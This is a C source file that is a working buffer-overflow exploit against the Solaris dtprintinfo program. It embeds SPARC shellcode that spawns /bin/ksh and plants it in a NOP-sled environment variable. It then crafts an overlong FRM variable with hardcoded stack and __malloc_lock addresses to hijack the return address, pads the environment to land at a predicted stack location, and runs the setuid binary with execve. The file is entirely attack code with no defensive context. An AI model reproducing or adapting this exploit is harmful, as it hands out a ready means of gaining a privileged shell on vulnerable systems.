#include <stdio.h>
#include <string.h>
#include <sys/systeminfo.h>

#define ENVBUF 5008
#define FRM 4000
#define NOPS 200
/*this is the location we want to NAIL the "FRM=" to */
/*this location will read "FRM=" so that we know exactly where we
are when the attack is running - precision is key.*/
// old #define STACKTARGET 0xffbedc80
#define STACKTARGET 0xffbedc84

/* lsd shellcode. */
char shellcode[]=
    "\x90\x08\x3f\xff"     /* and     %g0,-1,%o0           */
    "\x82\x10\x20\x17"     /* mov     0x17,%g1             */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh"
;

int
main(int argc,char **argv) {

char *argp[2];
char *envp[8];
char display[128];
char home[8];
char platform[256];
char buf[ENVBUF];
char frm[FRM];
int align, p;
int subval;
char *pathenv;
char *ldlib;
unsigned int frmlength,frmplace;

if(argc==3)
   align=atoi(argv[02]);
    
else
   align=-2;


if(argc<2 || argc>3) {
  printf("usage: %s xserver:display <alignment>\n",argv[0]);
  exit(-1);
 }

else {


sprintf(display,"DISPLAY=%s",argv[1]);
memset(buf,0x41,sizeof(buf)); /*fill up so no nulls*/
memset(home,0x00,sizeof(home));
memcpy(home,"HOME=.",strlen("HOME=."));


/*Setting up the buffer we use to send our shellcode in*/
memset(buf,0x90,sizeof(buf));
buf[ENVBUF-1]=0; /*null terminate it*/
memcpy(buf,"ODB=",4);
memcpy((buf+NOPS)+align,shellcode,strlen(shellcode)); 

memset(frm,0x43,FRM);
memset(frm+354,0x69,FRM-354); 
memcpy(frm,"FRM=",4);

#define FUDGE 4

/* i0 (also i2) send to __malloc_lock 0xfed3a510*/
frm[348+FUDGE]=0xfe;
frm[349+FUDGE]=0xd3;
frm[350+FUDGE]=0xa5;
frm[351+FUDGE]=0x10;


/* i1 send to shellcode 0xffbeec80 */
frm[352+FUDGE]=0xff;
frm[353+FUDGE]=0xbe;
frm[354+FUDGE]=0xec;
frm[355+FUDGE]=0x80;


/* fp, set to 43's in FRM 0xffbedd28 */
frm[372+FUDGE]=0xff;
frm[373+FUDGE]=0xbe;
frm[374+FUDGE]=0xdd;
frm[375+FUDGE]=0x28;

/* return pc goto __malloc_lock which should contain nops if strcpy() was successful */
frm[376+FUDGE]=0xfe;
frm[377+FUDGE]=0xd3;
frm[378+FUDGE]=0xa5;
frm[379+FUDGE]=0x10;

frm[FRM-3]=0;

sysinfo(SI_PLATFORM,platform,256);
printf("Using platform of *%s*\n",platform);

buf[5000]=0;  

pathenv=(char *)strdup("PATH=.:/usr/bin");
ldlib=(char *)strdup("LD_LIBRARY_PATH=/lib:/usr/lib:/usr/openwin/lib:/usr/dt/lib");

envp[0]=frm; /* our stack frames that we use */
envp[1]=pathenv;
envp[2]=buf; /* shellcode */
envp[3]=home;
envp[4]=display;
envp[5]=ldlib;
envp[6]=0;

argp[0]=(char *) strdup("/usr/dt/bin/dtprintinfo");
argp[1]=0;

/*+4 at end for a null word on the end of the stack*/
/*basicaly we go through the arguments and environment and add the strlengths, then we add the strlen of the platform and 
  4 bytes for the null word at the end of the stack. This whole thing then is going to be word aligned by the OS, so 
  we then use that value %4 to get where FRM= is going to be located in memory.

  So now we know the EXACT location of FRM= on the stack, and we that it is exactly word aligned.

  To make this work, we need to control the length of one of these buffers such that FRM= is at exactly a location we have 
  already predicted.
*/

frmlength=strlen(frm)+1+strlen(pathenv)+1+strlen(buf)+1+strlen(home)+1+strlen(display)+1+strlen(platform)+1+strlen(argp[0])+1+strlen(ldlib)+1+4;
frmplace= (0xffbeffff-(frmlength) ) - ((0xffbeffff-(frmlength) ) % 4);
printf("strlen(env)=%d location of frm= is at 0x%4x\n",frmlength,frmplace);


/*
  now we want to make that number a WORD aligned number at 0xffbedc80. So we take frmplace and subtract from the length of buf
  to get 0xffbedc80.
*/
subval=STACKTARGET-frmplace;
buf[strlen(buf)-subval]=0; /*here we prematurely terminate buf to pad out frmplace to be what we want.*/
frmlength=strlen(frm)+1+strlen(pathenv)+1+strlen(buf)+1+strlen(home)+1+strlen(display)+1+strlen(platform)+1+strlen(argp[0])+1+strlen(ldlib)+1+4;
frmplace= (0xffbeffff-(frmlength) ) - ((0xffbeffff-(frmlength) ) % 4);
printf("strlen(env)=%d location of frm= is at 0x%4x\n",frmlength,frmplace);


printf("execve() started.\n");
fflush(0);
//execve("/usr/bin/env",argp,envp);
execve("/usr/dt/bin/dtprintinfo",argp,envp);
printf("execve() failed.\n");
} 
} 
